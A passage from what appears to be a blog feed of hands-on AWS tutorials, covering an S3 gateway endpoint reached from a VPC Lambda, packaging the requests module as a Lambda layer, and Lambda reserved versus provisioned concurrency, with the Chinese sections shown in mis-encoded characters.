section in the official documentation</p><blockquote><p><a href="https://docs.aws.amazon.com/vpc/latest/privatelink/vpc-endpoints-s3.html#gateway-endpoint-considerations-s3">https://docs.aws.amazon.com/vpc/latest/privatelink/vpc-endpoints-s3.html#gateway-endpoint-considerations-s3</a></p></blockquote><h2 id="Private-DNS"><a href="#Private-DNS" class="headerlink" title="Private DNS"></a>Private DNS</h2><p>When you are trying yo create Gateway Endpoint or Interface Endpoint for your S3, you can decide creating private DNS for cost down.</p><blockquote><p>This is implement by Route53 Resolver<br>For detail you can checkï¼š<a href="https://docs.aws.amazon.com/zh_tw/Route53/latest/DeveloperGuide/resolver.html">https://docs.aws.amazon.com/zh_tw/Route53/latest/DeveloperGuide/resolver.html</a></p></blockquote><h1 id="Steps-for-building-Gateway-Endpoint"><a href="#Steps-for-building-Gateway-Endpoint" class="headerlink" title="Steps for building Gateway Endpoint"></a><a href="https://docs.aws.amazon.com/zh_tw/vpc/latest/privatelink/vpc-endpoints-s3.html#create-gateway-endpoint-s3">Steps for building Gateway Endpoint</a></h1><ul><li>Go to AWS Console to create the endpoint</li></ul><blockquote><p>VPC &#x2F; Endpoints &#x2F; Create Endpoint</p></blockquote><p><img src="https://i.imgur.com/asOslk6.png" alt="Imgur"></p><ul><li>Choose <code>AWS services</code> , and <code>com.amaazonaws.us-east-1.s3</code></li></ul><p><img src="https://i.imgur.com/ujgXmUq.png" alt="Imgur"></p><ul><li>Then, press create endpoints</li></ul><h2 id="Associate-Route-Table"><a href="#Associate-Route-Table" class="headerlink" title="Associate Route Table"></a>Associate Route Table</h2><ul><li>Make sure the route table that assoicate to the gateway endpoint is clean.<blockquote><p>If you donâ€™t have on, then make one.</p></blockquote></li></ul><p><img src="https://i.imgur.com/cI4mrOt.png" alt="Imgur"></p><h2 id="Configure-policy"><a href="#Configure-policy" class="headerlink" title="Configure policy"></a>Configure policy</h2><ul><li>For testing purposes, I choose <code>Full Access</code></li></ul><p><img src="https://i.imgur.com/kiQtSej.png" alt="Imgur"></p><ul><li>Then, press create endpoint</li></ul><h2 id="Check-the-routing"><a href="#Check-the-routing" class="headerlink" title="Check the routing"></a>Check the routing</h2><p>After establishing the endpoint, you can check if the default route of route table is well configured</p><p><img src="https://i.imgur.com/3Ajfl91.png" alt="Imgur"></p><p>Next, we must configure a Lambda function for accessing S3 bucket.</p><h2 id="Configure-Lambda-Function"><a href="#Configure-Lambda-Function" class="headerlink" title="Configure Lambda Function"></a>Configure Lambda Function</h2><p>If you put a Lambda funciton into a VPC, it will attach to 2 subnets by defaults.</p><p>Make sure two subnet have default route to S3 Gateway Endpoints.</p><p><img src="https://i.imgur.com/XmbfUKe.png" alt="Imgur"><br><img src="https://i.imgur.com/AP6fZGy.png" alt="Imgur"></p><ul><li>Create Lambda function, and enable the VPC</li></ul><p><img src="https://i.imgur.com/eBfWExA.png" alt="Imgur"></p><ul><li>Lambda Code</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> boto3</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lambda_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;CREATE CLIENT&quot;</span>)</span><br><span class="line">    s3 = boto3.client(<span class="string">&quot;s3&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;START REQUEST&quot;</span>)</span><br><span class="line">    resp = s3.list_objects(Bucket=<span class="string">&quot;testbucket4-s3gateway-endpoint&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(resp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;statusCode&#x27;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: json.dumps(<span class="string">&#x27;Hello from Lambda!&#x27;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>In this Lambda code, Lambda will try to list the objects in the bucket, can print out the information of  response object in the log.</p><ul><li>Configure policy of Lambda execution role</li></ul><p>I simply attach AWS Managed Policy <code>AmazonS3FullAccess</code> to the execution role for testing</p><blockquote><p>Notice, you should not give full access to your Lambda function in production mode, make sure giving adequient permssion to the role.</p></blockquote><p><img src="https://i.imgur.com/U3mPX0h.png" alt="Imgur"></p><h2 id="Check-invocations"><a href="#Check-invocations" class="headerlink" title="Check invocations"></a>Check invocations</h2><ul><li>Press <code>test</code> button in the Lambda console, youâ€™ll noticee the lambda get invoked successfully</li></ul><p><img src="https://i.imgur.com/WB3iyyD.png" alt="Imgur"></p><ul><li>Then you need to check the invocation logs in CloudWatch</li></ul><p><img src="https://i.imgur.com/j5q8yCp.png" alt="Imgur"></p><p>You can see that the object information were listed and printed out in the invocation logs.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://docs.aws.amazon.com/zh_tw/vpc/latest/privatelink/vpc-endpoints-s3.html#create-gateway-endpoint-s3">https://docs.aws.amazon.com/zh_tw/vpc/latest/privatelink/vpc-endpoints-s3.html#create-gateway-endpoint-s3</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#types-of-vpc-endpoints-for-s3">https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#types-of-vpc-endpoints-for-s3</a><br>[3] <a href="https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#accessing-s3-interface-endpoints">https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#accessing-s3-interface-endpoints</a></p>]]></content>
      
      
      <categories>
          
          <category> å¯¦ä½œç´€éŒ„ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> S3 </tag>
            
            <tag> Endpoints </tag>
            
            <tag> Gateway </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lambda_layer æ¦‚å¿µå’Œå¯¦ä½œ</title>
      <link href="/posts/f40d2e89.html"/>
      <url>/posts/f40d2e89.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é‡å° Lambda è¨­å®šï¼Œçµ•å¤§å¤šæ•¸äººä¸€å®šç¢°é <code>ImportModuleError</code>  æ‰€ä»¥å„ä½å¯ä»¥è·Ÿè‘—ä»¥ä¸‹çš„æƒ…å¢ƒï¼Œé–‹ä¸€å€‹ä¸€æ¨£çš„ Lambda ç’°å¢ƒé€æ­¥æ“ä½œã€‚</p><h2 id="æƒ…å¢ƒ"><a href="#æƒ…å¢ƒ" class="headerlink" title="æƒ…å¢ƒ"></a>æƒ…å¢ƒ</h2><ul><li>Region: <code>IAD(us-east-1)</code></li><li>Runtime: <code>Python3.11</code></li><li>Lambda Name: â€œITHomeLambdaFunctionâ€</li><li>Lambda code<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lambda_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    <span class="comment"># TODO implement</span></span><br><span class="line">    x = requests.get(<span class="string">&#x27;https://www.ntust.edu.tw/&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(x.text)</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;statusCode&#x27;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: json.dumps(<span class="string">&#x27;Hello from Lambda!&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="Error-Runtime-ImportModuleError"><a href="#Error-Runtime-ImportModuleError" class="headerlink" title="[Error]: Runtime.ImportModuleError"></a>[Error]: Runtime.ImportModuleError</h2><p>å¦‚æœä½ æŒ‰ç…§ä¸Šè¿°æƒ…å¢ƒéƒ¨ç½²ï¼Œä¸¦ä¸”é€²è¡Œæ¸¬è©¦ï¼Œå¯èƒ½æœƒå ±å‡ºé¡ä¼¼ä¸‹é¢çš„éŒ¯èª¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;errorMessage&quot;: &quot;Unable to import module &#x27;lambda_function&#x27;: No module named &#x27;requests&#x27;&quot;,</span><br><span class="line">  &quot;errorType&quot;: &quot;Runtime.ImportModuleError&quot;,</span><br><span class="line">  &quot;requestId&quot;: &quot;.......&quot;,</span><br><span class="line">  &quot;stackTrace&quot;: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€™å€‹éŒ¯èª¤çš„åŸå› åœ¨æ–¼ï¼Œåœ¨ AWS Lambda python 3.8 Runtime ä¹‹å¾Œçš„ç‰ˆæœ¬å°±æ²’æœ‰åŸç”Ÿæ”¯æ´ requests æ¨¡çµ„ï¼Œæœƒéœ€è¦è‡ªå·±æ·»åŠ <strong>å±¤ï¼ˆlayerï¼‰</strong></p><h2 id="ä»€éº¼æ˜¯-Lambda-å±¤ï¼ˆLayerï¼‰"><a href="#ä»€éº¼æ˜¯-Lambda-å±¤ï¼ˆLayerï¼‰" class="headerlink" title="ä»€éº¼æ˜¯ Lambda å±¤ï¼ˆLayerï¼‰"></a>ä»€éº¼æ˜¯ Lambda å±¤ï¼ˆLayerï¼‰</h2><p>åœ¨ Lambda ä¸­ï¼Œ Layer æ˜¯ç”¨ä¾†å­˜æ”¾dependency æˆ–è€…æ˜¯æ¨¡çµ„ç”¨çš„zip å£“ç¸®æª”ã€‚ä¸åŒçš„ Lambda å‡½æ•¸ä¹Ÿå¯ä»¥é€šé layer ä¾†å»å…±äº«è³‡æ–™ã€‚</p><p>ä¸€æ—¦ä½ ç‚ºä½ çš„ Lambda å‡½æ•¸æ–°å¢ä¸€å€‹ Layerï¼Œ<strong>Lambda å°±æœƒå»å°‡ä½  layerç•¶ä¸­çš„è³‡æ–™æ”¾åˆ° Lambda åŸ·è¡Œç’°å¢ƒä¸­çš„ <code>/opt</code> ç›®éŒ„åº•ä¸‹</strong>ã€‚</p><p><img src="https://hackmd.io/_uploads/H1a_iXvk6.png"></p><blockquote><p>æ³¨æ„ï¼š æ¯å€‹å‡½æ•¸æœ€å¤šåªèƒ½åŒ…å«5å€‹ Layer </p></blockquote><h2 id="æ‰“åŒ…æ¨¡çµ„åˆ°-Layer"><a href="#æ‰“åŒ…æ¨¡çµ„åˆ°-Layer" class="headerlink" title="æ‰“åŒ…æ¨¡çµ„åˆ° Layer"></a>æ‰“åŒ…æ¨¡çµ„åˆ° Layer</h2><p>æ¯å€‹ Layer ç•¶ä¸­çš„æ¨¡çµ„ï¼Œéš¨è‘—ä½ ä½¿ç”¨ Runtime çš„ä¸åŒï¼Œæ‰“åŒ… zipæª”æ™‚æœƒéœ€è¦éµå¾ªä¸åŒçš„æª”æ¡ˆçµæ§‹ [1]ã€‚</p><p>ä»¥ Python ä¾†èªª æª”æ¡ˆçµæ§‹å¯ä»¥æ˜¯:</p><ul><li><code>/opt/python</code></li><li><code>/opt/python/lib/python3.x/site-packages </code></li></ul><p>è€Œæ‰€æœ‰ Runtime éƒ½æ”¯æ´ä»¥ä¸‹å…©ç¨®é¡å¤–çš„ç›®éŒ„ï¼š</p><ul><li><code>/bin (PATH)</code></li><li><code>/lib (LD_LIBRARY_PATH)</code></li></ul><p>ç¾åœ¨æˆ‘å€‘å°±ä¾†ç‚º requests æ‰“åŒ…æˆå£“ç¸®æª”å§</p><ol><li>æœ¬æ©Ÿå°è£å±¤å…§å®¹ï¼Œè«‹åŸ·è¡Œä¸‹é¢çš„æŒ‡ä»¤ï¼Œè‹¥æ‚¨çš„å¥—ä»¶å®‰è£å·¥å…·æ˜¯ pip3 å‰‡å°‡æŒ‡ä»¤é–‹é ­æ›¿æ›æˆ pip3</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests --target=./python </span><br></pre></td></tr></table></figure><p>é€™æœƒåœ¨ä½ æœ¬åœ°ç•¶ä¸­å»ºç«‹ python&#x2F; ç›®éŒ„ï¼Œä¸¦å°‡æ‰€éœ€çš„æ¨¡çµ„ä¸‹è¼‰åˆ°ç›®éŒ„ä¸­ï¼Œè«‹æ³¨æ„é€™è£¡çš„ç›®éŒ„åç¨±éœ€è¦èˆ‡ Runtime æ‰€ä½¿ç”¨çš„èªè¨€åŒ¹é…ã€‚</p><ol start="2"><li><p>æ‰“åŒ…ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r layer.zip python/</span><br></pre></td></tr></table></figure><p>å»å°‡ python ç›®éŒ„åº•ä¸‹çš„æ‰€æœ‰æª”æ¡ˆæ‰“åŒ…è‡³ä¸€å€‹ zipæª”</p></li><li><p>åœ¨Lambda ä¸»æ§å°ä¸­ï¼Œå·¦å´å°è¦½å€åŸŸä¸­æœ‰å€‹ <strong>layer</strong>ï¼Œé»é¸å¾Œæœƒè·³è½‰è‡³layeré é¢ï¼Œå¯ä»¥åœ¨é é¢ä¸­é¸æ“‡æ–°å¢æ–°çš„layer</p></li></ol><p><img src="https://hackmd.io/_uploads/SyjslEwya.png"></p><p>ç‚ºLayer å–åä¸¦ä¸”åœ¨é é¢ä¸­ä¸Šå‚³å‰›æ‰å»ºç«‹çš„ <code>layer.zip</code>ï¼Œæ¥è‘—é¸æ“‡ Runtime ä»¥åŠæ¶æ§‹å¾Œå°±å¯ä»¥å»ºç«‹Layeräº†ã€‚</p><p><img src="https://hackmd.io/_uploads/HkELWNPJa.png"></p><p>å®Œæˆå¾Œå°±å›åˆ° Lambda ä¸»é å»æ–°å¢ Layer</p><p><img src="https://hackmd.io/_uploads/HkbdbNvyp.png"></p><p>æ–°å¢ Layer çš„é é¢ä¸­é¸æ“‡ Custom Layerï¼Œå°±å¯ä»¥çœ‹åˆ°å‰›å‰›å»ºç«‹çš„ Layeräº†ã€‚</p><p><img src="https://hackmd.io/_uploads/S1esbVwJp.png"></p><h2 id="æ¸¬è©¦"><a href="#æ¸¬è©¦" class="headerlink" title="æ¸¬è©¦"></a>æ¸¬è©¦</h2><p>é€™æ™‚å†åº¦å¾ä¸»æ§å°æŒ‰ä¸‹æ¸¬è©¦ï¼Œå°±ä¸æœƒå ±éŒ¯äº†</p><p><img src="https://hackmd.io/_uploads/rkNaf4v16.png"></p><p>æˆ–è€…é€šé AWS CLI å»èª¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke \</span><br><span class="line">    --cli-binary-format raw-in-base64-out \</span><br><span class="line">    --function-name ITHomeLambdaFunction \</span><br><span class="line">    --payload &#x27;&#123; &quot;Test&quot;: &quot;ITHome&quot; &#125;&#x27; \</span><br><span class="line">    response.json</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/HkRKONw1a.png"></p><p>å»çœ‹ CloudWatch ä¹Ÿèƒ½æ”¶åˆ°è³‡æ–™</p><blockquote><p>é›–ç„¶æŠŠåå›ä¾†çš„æ±è¥¿æ‹†æˆä¸€å€‹ä¸€å€‹log entry å¾ˆæ€ªXD</p></blockquote><p><img src="https://hackmd.io/_uploads/ryK-tEvkp.png"></p><h2 id="åƒè€ƒè³‡æ–™"><a href="#åƒè€ƒè³‡æ–™" class="headerlink" title="åƒè€ƒè³‡æ–™"></a>åƒè€ƒè³‡æ–™</h2><p>[1] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/packaging-layers.html#packaging-layers-paths">æ¯å€‹ Lambda åŸ·è¡Œæ™‚é–“çš„å±¤è·¯å¾‘</a></p>]]></content>
      
      
      <categories>
          
          <category> å¯¦ä½œç´€éŒ„ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Lambda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWS LambdaçŸ¥è­˜æ•´ç† | ä½ˆå»ºä¸¦è¡Œ | é ç•™ä¸¦è¡Œ</title>
      <link href="/posts/a09fae.html"/>
      <url>/posts/a09fae.html</url>
      
        <content type="html"><![CDATA[<h2 id="å›é¡§"><a href="#å›é¡§" class="headerlink" title="å›é¡§"></a>å›é¡§</h2><p>å‰é¢æœ‰æåŠäº† Lambda çš„åŸºæœ¬ä»‹ç´¹ã€Lambda Runtimeã€æ¬Šé™é…ç½® ä»¥åŠå¾æ—¥èªŒä¸Šè§€å¯Ÿåˆå§‹åŒ–æ™‚é–“ä»¥åŠå‡½æ•¸åŸ·è¡Œæ™‚é–“ã€‚</p><p>æœ€å¾Œæˆ‘å€‘æœ‰æåˆ°ä¸€å€‹å•é¡Œï¼Œé‚£å°±æ˜¯</p><blockquote><p>å¦‚æœæˆ‘å€‘ç”¨ AWS CLI å»èª¿ç”¨ Lambda å‡½æ•¸ï¼Œç”¨ Terminal ä¸€æ¬¡é–‹ä¸‰å€‹TabåŒæ™‚èª¿ç”¨æˆ‘å€‘çš„ Lambda å‡½æ•¸æœƒç™¼ç”Ÿä»€éº¼äº‹ï¼Ÿ</p></blockquote><h2 id="å¯¦é©—ä¸€-è¨­ç½®-Reserved-Concurrency"><a href="#å¯¦é©—ä¸€-è¨­ç½®-Reserved-Concurrency" class="headerlink" title="å¯¦é©—ä¸€ - è¨­ç½® Reserved Concurrency"></a>å¯¦é©—ä¸€ - è¨­ç½® Reserved Concurrency</h2><p>æˆ‘å€‘åŸ·è¡Œä»¥ä¸‹æŒ‡ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke \</span><br><span class="line">    --function-name TestInvocations \</span><br><span class="line">    --cli-binary-format raw-in-base64-out \</span><br><span class="line">    --payload &#x27;&#123; &quot;name&quot;: &quot;test&quot; &#125;&#x27; \</span><br><span class="line">    response.json</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/ry_jkJsRn.png"></p><p>äº‹å¯¦ä¸Šä»–éƒ½å¯ä»¥æˆåŠŸï¼Œä¸¦ä¸”æœƒåœ¨ CloudWatch ä¸Šç”¢ç”Ÿä¸‰ç­†Log Streamã€‚ </p><p><img src="https://hackmd.io/_uploads/SJ64-1iCn.png"></p><p>ä½†å¦‚æœæˆ‘å€‘å»è¨­å®šå‹•ä¸€é»æ‰‹è…³ï¼Œæˆ‘å€‘å°‡æŸå€‹å«åš <strong>Reserved Concurrency</strong> çš„è¨­å®šèª¿æ•´æˆ1ï¼Œä¸¦æŒ‰ä¸‹ savedã€‚ä¸¦ä¸”é‡æ–°é€é CLI åŸ·è¡Œèª¿ç”¨çš„æŒ‡ä»¤ï¼Œçœ‹æœƒç™¼ç”Ÿä»€éº¼äº‹ã€‚</p><p><img src="https://hackmd.io/_uploads/Sk6GZJsCn.png"></p><p>é€™æ™‚å€™æœƒç™¼ç¾ï¼Œåªæœ‰ä¸€å€‹è«‹æ±‚æˆåŠŸå›å‚³200ï¼Œå…¶ä»–éƒ½è¢« Throttledã€‚æœƒå›å‚³ <code>TooManyRequestsException</code> çš„éŒ¯èª¤è¨“æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An error occurred (TooManyRequestsException) when calling the Invoke operation</span><br></pre></td></tr></table></figure><p>é€™å¿…é ˆæåˆ° Lambda æ‡‰å°åŒæ™‚é–“å¤§é‡è«‹æ±‚çš„è™•ç†æ©Ÿåˆ¶ã€‚</p><blockquote><p>é¦–å…ˆï¼Œä»€éº¼æ˜¯ Reserved Concurrency? ä»€éº¼åˆæ˜¯ Unresereved Concurrency?</p></blockquote><h2 id="é ç•™ä¸¦è¡Œ-Reserved-Concurrency"><a href="#é ç•™ä¸¦è¡Œ-Reserved-Concurrency" class="headerlink" title="é ç•™ä¸¦è¡Œ(Reserved Concurrency)"></a>é ç•™ä¸¦è¡Œ(Reserved Concurrency)</h2><p>è«‡åˆ° Concurrencyï¼Œä¸­æ–‡å«åšä¸¦è¡Œæˆ–ä½µç™¼ã€‚é€™ä»£è¡¨ä»€éº¼ï¼Ÿé€™ä»£è¡¨åŒä¸€æ™‚é–“çš„å¤šå€‹è«‹æ±‚ã€‚ç‚ºäº†æ‡‰å°é€™åŒæ™‚ä¾†è‡¨çš„è«‹æ±‚ï¼ŒLambda å‡½æ•¸æœƒå»è‡ªå‹•æ“´å±•ã€‚ Serverless åˆ°å¥½è™•å°±æ˜¯ï¼Œä½ ä¸éœ€è¦è€ƒé‡è©²å¦‚ä½•ç‚º Lambda è¨­ç½®æ“´å±•ï¼Œåƒæ˜¯æ€éº¼è¨­å®š auto-scaling çš„åŠŸèƒ½ã€‚</p><p>åœ¨ Lambda ç•¶ä¸­ï¼Œå°æ–¼åŒä¸€å€‹å‡½æ•¸ï¼Œä½¿ç”¨è€…åªéœ€è¦è€ƒé‡ã€Œ<strong>å°æ–¼é€™å€‹Lambda å‡½æ•¸ï¼Œä½ æœƒéœ€è¦éš¨æ™‚ç‚ºå®ƒä¿ç•™å¤šå°‘æ•¸é‡çš„åŸ·è¡Œå€‹é«”ï¼Ÿ</strong></p><p>é€™æ™‚ï¼Œä½ å°±å¯ä»¥è€ƒæ…®ç‚ºä½ çš„å‡½æ•¸è¨­å®š Reserved Concurrencyã€‚</p><p>é ç•™ä¸¦è¡Œæ˜¯è¦åˆ†é…çµ¦å‡½æ•¸çš„ä¸¦è¡ŒåŸ·è¡Œå€‹é«”æ•¸é‡ä¸Šé™ã€‚ç•¶æŸå€‹å‡½æ•¸å…·æœ‰é ç•™ä¸¦è¡Œæ™‚ï¼Œå…¶ä»–å‡½æ•¸éƒ½ç„¡æ³•ä½¿ç”¨è©²ä¸¦è¡Œã€‚</p><p><strong>å¦‚æœä½ åœ¨ Lambda ä¸»æ§å°ä¸Šè¨­å®š Reserved Concurrencyç‚º 1ï¼Œå°±æœƒå¾ Unreserved Concurrency ç•¶ä¸­æ‰£é™¤æ‰ 1</strong>ã€‚</p><p>è€Œé€™å€‹è¨­å®šæ˜¯å€åŸŸå‹çš„é™åˆ¶ (Regional)ï¼Œè‹¥ä½ ç‚ºæŸå€‹å‡½æ•¸è¨­å®šResevered Concurrecny ç‚º 100 é‚£å‰©ä¸‹çš„ 900 å°±æœƒæ˜¯ç”±å€åŸŸå…§å…¶ä»–å‡½æ•¸å…±ç”¨ã€‚</p><blockquote><p>å¯ä»¥ç‚ºä¸€å€‹å‡½æ•¸ä¿ç•™å¤šå°‘æ•¸é‡çš„ Concurrency?</p></blockquote><p>ç­”æ¡ˆæœƒæ˜¯ï¼Œ <code>UnreservedConcurrency - 100</code> æ•¸é‡çš„ä¸¦è¡Œã€‚<br>ä¹Ÿå°±æ˜¯èªªä¸€å€‹å‡½æ•¸ä¸å¯ä»¥ç¨ä½”æ‰€æœ‰çš„ä¸¦è¡Œåƒ…ç‚ºé€™å€‹å‡½æ•¸ä¾†åŸ·è¡Œï¼Œèµ·ç¢¼æœƒç•™ä¸‹ 100 å€‹ä¸¦è¡Œæ•¸é‡çµ¦å…¶ä»–å‡½æ•¸å…±ç”¨ã€‚</p><blockquote><p>ä½ è¦å¦‚ä½•æ±ºå®šä½ çš„å‡½æ•¸æ”¹ä¿ç•™å¤šå°‘ä¸¦è¡Œï¼Ÿ</p></blockquote><p>ä½ å¯ä»¥é€é‹è§€å¯Ÿ CloudWatch æŒ‡æ¨™ <code>ConcurrentExecutions</code> ä¾†æ±ºå®š [1]ã€‚ é€™å€‹æŒ‡æ¨™å¯ä»¥è§€å¯Ÿåˆ°å°æ–¼ä½ çš„å‡½æ•¸è€Œè¨€ï¼Œä¸€å¤©ä¸‹ä¾†ä¸åŒæ™‚é–“æ®µçš„ä¸¦è¡Œè«‹æ±‚æ•¸é‡ï¼Œå‡è¨­é€™å€‹å‡½æ•¸ä¸€å¤©ä¸€æ¬¡æœ€å¤šæœƒæœ‰ 30å€‹è«‹æ±‚é€²ä¾†ï¼Œä¸¦ä¸”é€™å€‹å‡½æ•¸å°ä½ å¾ˆé‡è¦ï¼Œé‚£å°±å¯ä»¥è€ƒæ…®ä¿ç•™ 30 å€‹ Lambda åŸ·è¡Œå€‹é«”ä¾†è™•ç†è«‹æ±‚ã€‚</p><blockquote><p>å¦å¤–å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¨­å®šå‡½æ•¸çš„é ç•™ä¸¦è¡Œä¸æœƒæ”¶è²»</p></blockquote><h2 id="ä½ˆå»ºä¸¦è¡Œ-ï¼ˆProvision-Conccurencyï¼‰"><a href="#ä½ˆå»ºä¸¦è¡Œ-ï¼ˆProvision-Conccurencyï¼‰" class="headerlink" title="ä½ˆå»ºä¸¦è¡Œ ï¼ˆProvision Conccurencyï¼‰"></a>ä½ˆå»ºä¸¦è¡Œ ï¼ˆProvision Conccurencyï¼‰</h2><p>å¯èƒ½æœƒæœ‰äººå¥½å¥‡ï¼Œå¦‚æœå‡½æ•¸æœƒæ ¹æ“šè«‹æ±‚æ“´å±•ï¼Œé‚£å•Ÿå‹•æ–°çš„åŸ·è¡Œç’°å¢ƒï¼Œé€™æ¨£å°æ–¼ time-sensitive çš„è«‹æ±‚ä¾†èªªï¼Œå»¶é²ä¸æœƒå¾ˆä¹…å—ï¼Ÿ</p><p><img src="https://hackmd.io/_uploads/ByoYHrrkp.png"></p><blockquote><p>åœ–ç‰‡ä¾†æºï¼š AWS å®˜ç¶²</p></blockquote><p>é€™å€‹æƒ³æ³•æ²’éŒ¯ï¼Œå¯ä»¥çœ‹åˆ°ä¸Šåœ–çš„æ•¸å­—4ï¼Œå°±æ˜¯é€™æ¨£çš„ç‹€æ³ã€‚</p><p>é€™ä»£è¡¨ 3 å€‹åŸ·è¡Œç’°å¢ƒåœ¨è™•ç† 3 å€‹è«‹æ±‚ï¼Œä½†ç¬¬4å€‹è«‹æ±‚å‡ºä¾†æ™‚ï¼Œå°±å¿…é ˆåˆå§‹åŒ–ä¸€å€‹æ–°çš„ Lambda åŸ·è¡Œç’°å¢ƒã€‚ é€™æ¨£å°±å‹¢å¿…æœ‰å»¶é²ï¼Œéœ€è¦ç­‰å¾… Runtime å•Ÿå‹•ï¼Œä¸‹è¼‰ Lambda code å’Œ dependencyï¼Œä»¥åŠå»åŸ·è¡Œ Handler ä»¥å¤–çš„ç¨‹å¼å€å¡Šï¼ˆå¦‚æœæœ‰çš„è©±ï¼‰ã€‚</p><p>ä½ˆå»ºä¸¦è¡Œçš„æ„ç¾©åœ¨æ–¼ <strong>ã€Œç‚ºå‡½æ•¸é å…ˆåˆå§‹åŒ–å¤šå€‹ç’°å¢ƒåŸ·è¡Œå€‹é«”ï¼Œæœ‰åŠ©æ–¼ç¸®çŸ­å†·å•Ÿå‹•å»¶é²ã€</strong></p><p><strong>å†·å•Ÿå‹•å»¶é² ï¼ˆCold Startï¼‰</strong> å°±æ˜¯ Lambda åŸ·è¡Œç’°å¢ƒåœ¨å•Ÿå‹•è¼‰å…¥æ™‚ï¼Œé€™æ®µä¸å¯æ§çš„å»¶é²æ™‚é–“ï¼ˆä¸åŒ…å« Function Init, ä¹Ÿå°±æ˜¯åŸ·è¡Œ handler ç¨‹å¼å¤–å€æ®µçš„åˆå§‹åŒ–æ™‚é–“ï¼‰ã€‚é€™éƒ¨åˆ†æˆ‘å€‘æœƒåœ¨å¾Œé¢æåˆ°ã€‚</p><p>å›åˆ° Provision Concurrencyï¼Œæ‰€ä»¥å¦‚æœè¨­å®šäº† Provision Concurrencyï¼Œåœ–ç‰‡æ¯”è¼ƒæœƒé¡ä¼¼ä¸‹é¢ã€‚</p><p>å‡è¨­ Provision Concurrency è¨­æˆ4ã€‚ é‚£ä¸€é–‹å§‹å°±æœƒæœ‰å››å€‹ Lambda åŸ·è¡Œç’°å¢ƒé€²è¡Œåˆå§‹åŒ–ã€‚ä¸¦ä¸”å¾ŒçºŒçš„è«‹æ±‚éƒ½æœƒé‡ç”¨é‚£å››å€‹ Lambda ç’°å¢ƒï¼Œä¹Ÿå°±æ˜¯èªªç•¶é€™è£¡å°±ä¿è­‰äº†ä¸€å®šæœƒæœ‰ 4å€‹åˆå§‹åŒ–éçš„ Lambda 